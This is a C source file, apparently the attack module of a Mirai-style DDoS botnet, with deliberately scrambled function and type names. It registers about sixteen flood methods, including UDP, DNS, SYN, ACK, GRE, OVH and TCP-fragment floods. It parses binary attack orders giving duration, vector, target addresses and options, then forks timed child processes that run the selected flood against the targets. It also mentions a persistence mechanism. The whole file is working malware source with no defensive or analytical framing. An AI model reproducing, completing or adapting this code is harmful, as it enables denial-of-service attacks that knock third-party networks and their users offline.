#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
extern int _ib2tD7y;
uint8_t methods_len = 0;
struct _jh5Ek6N **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
BOOL Hu6uf7y(void)
{
    int i;
    wv2aC8v(ATK_VEC_UDP, (_hA2DK2q)Tv3eT5t);
    wv2aC8v(ATK_VEC_VSE, (_hA2DK2q)gb2ob7U);
    wv2aC8v(ATK_VEC_DNS, (_hA2DK2q)Fq5Mk7Y);
	wv2aC8v(ATK_VEC_UDP_PLAIN, (_hA2DK2q)bx3we8X);
    wv2aC8v(ATK_VEC_SYN, (_hA2DK2q)zH8AM3C);
    wv2aC8v(ATK_VEC_ACK, (_hA2DK2q)gj7Ru2o);
    wv2aC8v(ATK_VEC_STOMP, (_hA2DK2q)Jr5JL6d);
    wv2aC8v(ATK_VEC_XMAS, (_hA2DK2q)Tn8aH6f);
    wv2aC8v(ATK_VEC_GREIP, (_hA2DK2q)aP5Kp4u);
    wv2aC8v(ATK_VEC_GREETH, (_hA2DK2q)yQ6Ut4X);
    wv2aC8v(ATK_VEC_STD, (_hA2DK2q)jG6oM6K);
    wv2aC8v(ATK_VEC_OVH, (_hA2DK2q)hF5fe6z);
    wv2aC8v(ATK_VEC_USYN, (_hA2DK2q)EA6XQ6C);
    wv2aC8v(ATK_VEC_TCPALL, (_hA2DK2q)Hs2Ny8u);
    wv2aC8v(ATK_VEC_TCPFRAG, (_hA2DK2q)as6WA6q);
    wv2aC8v(ATK_VEC_ASYN, (_hA2DK2q)Db5Ym3u);
    return TRUE;
}
void UV8wo4a(void)
{
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }
}
void dz4NW6v(char *buf, int len)
{
    int i;
    uint32_t duration;
    _Am6qv4K vector;
    uint8_t targs_len, opts_len;
    struct _Lw2SW5p *targs = NULL;
    struct _ak3Jy6Y *opts = NULL;
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);
    if (len == 0)
        goto cleanup;
    vector = (_Am6qv4K)*buf++;
    len -= sizeof (uint8_t);
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct _Lw2SW5p));
    if (!targs)
        goto cleanup;
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct _ak3Jy6Y));
        if (!opts)
            goto cleanup;
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);
            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));
            if (!opts[i].val)
                goto cleanup;
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }
    errno = 0;
    nu5hm7Y(duration, vector, targs_len, targs, opts_len, opts);
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        tU2kY3C(opts, opts_len);
}
void nu5hm7Y(int duration, _Am6qv4K vector, uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    int pid1, pid2;
    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)
        return;
    /* Release control port so persistence can detect main process death */
    if (_ib2tD7y >= 0) { close(_ib2tD7y); _ib2tD7y = -1; }
    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        int i;
        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }
        exit(0);
    }
}
char *Gm8Th7P(uint8_t opts_len, struct _ak3Jy6Y *opts, uint8_t opt, char *def)
{
    int i;
    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }
    return def;
}
int Cn6pZ7t(uint8_t opts_len, struct _ak3Jy6Y *opts, uint8_t opt, int def)
{
    char *val = Gm8Th7P(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}
uint32_t qM3bi3n(uint8_t opts_len, struct _ak3Jy6Y *opts, uint8_t opt, uint32_t def)
{
    char *val = Gm8Th7P(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}
static void wv2aC8v(_Am6qv4K vector, _hA2DK2q func)
{
    struct _jh5Ek6N *method = calloc(1, sizeof (struct _jh5Ek6N));
    struct _jh5Ek6N **tmp;
    if (!method)
        return;
    method->vector = vector;
    method->func = func;
    tmp = realloc(methods, (methods_len + 1) * sizeof (struct _jh5Ek6N *));
    if (!tmp)
    {
        free(method);
        return;
    }
    methods = tmp;
    methods[methods_len++] = method;
}
static void tU2kY3C(struct _ak3Jy6Y *opts, int len)
{
    int i;
    if (opts == NULL)
        return;
    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}